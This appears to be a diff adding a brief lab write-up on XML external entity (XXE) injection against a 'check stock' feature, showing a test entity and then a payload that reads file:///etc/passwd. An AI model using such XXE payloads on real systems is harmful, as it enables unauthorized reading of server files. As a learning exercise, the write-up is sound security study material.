@@ -1,0 +1,21 @@
+Exploiting XXE using external entities to retrieve files
+
+The app has a "check stock" feature that parses XML input and returns its out put.  to try it out I used this 
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "hello">
+]>
+<comment>
+    <text>&xxe;</text>
+</comment>
+
+and it displayed it. so i replaced it with
+
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+
+<comment>
+    <text>&xxe;</text>
+</comment> and it returned the contents of /etc/passwd
+
+
